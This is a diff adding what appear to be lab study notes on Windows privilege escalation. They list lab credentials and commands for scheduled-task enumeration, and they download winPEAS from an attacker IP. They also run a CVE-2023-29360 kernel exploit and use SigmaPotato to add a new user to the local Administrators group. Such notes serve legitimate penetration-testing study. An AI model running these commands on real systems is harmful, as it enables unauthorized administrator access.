@@ -1,0 +1,65 @@
+Windows Privilege Escalation
+
+Abusing Other Windows Components
+
+Scheduled Tasks
+
+CLIENTWK220
+steve/securityIsNotAnOption++++++
+ 
+Get-ScheduledTask
+schtasks /query /fo LIST /v
+icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+
+attacker 192.168.49.53
+target 192.168.53.221
+moss/work6potence6PLASMA6flint7
+
+xfreerdp3 /u:moss /p:work6potence6PLASMA6flint7 /v:192.168.53.221
+
+XblGameSaveTask
+\microsoft\XblGameSave\
+
+schtasks /query /tn "\microsoft\XblGameSave\" /v /fo LIST
+%windir%\System32\XblGameSaveTask.exe
+icacls C:\Windows\System32\XblGameSaveTask.exe
+BUILTIN\Users:(RX)
+
+another approach:
+cp /usr/share/peass/winpeas/winPEASx64.exe .
+iwr -uri http://192.168.49.53/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
+winPEAS.exe quiet scheduledtasks
+not found schedule task abuse info !
+
+--------
+Using Exploits
+CLIENTWK220
+steve/securityIsNotAnOption++++++
+
+kernel exploit:
+whoami /priv
+systeminfo
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
+.\CVE-2023-29360.exe
+whoami
+
+windows privilege exploit:
+SeImpersonatePrivilege
+LOCAL SERVICE, NETWORK SERVICE, and SERVICE accounts
+Named pipes
+SigmaPotato
+
+wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+.\SigmaPotato "net user dave4 lab /add"
+net user
+.\SigmaPotato "net localgroup Administrators dave4 /add"
+net localgroup Administrators
+
+
+
+
+
+
+
+
